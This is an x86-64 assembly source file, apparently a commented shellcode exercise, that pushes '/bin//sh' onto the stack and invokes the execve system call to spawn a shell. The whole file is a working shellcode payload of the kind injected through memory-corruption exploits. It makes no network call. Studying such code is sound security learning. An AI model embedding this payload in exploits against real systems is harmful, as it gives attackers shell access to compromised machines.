global _start

section .text
_start:

execve:
    ; 64 bit System V ABI 
    ; system calls use: RDI/RSI/RDX/R10/R8/R9

    ; int execve(const char *filename, char *const argv [], char *const envp[])
    ;                     RDI                 RSI                RDX

    xor rax, rax
    push rax          ; null terminate following string on stack

    mov rbx, 0x68732f2f6e69622f ; push /bin//sh on to stack
    push rbx

    mov rdi, rsp      ; point rdi to beginning of string just pushed

    push rax          ; null terminate following 
    mov rdx, rsp      ; rdx points to null on stack 

    push rdi          ; push address os /bin/sh on stack
    mov rsi, rsp      ; point rsi to that address

    add rax, 59       ; Syscall #59
    syscall
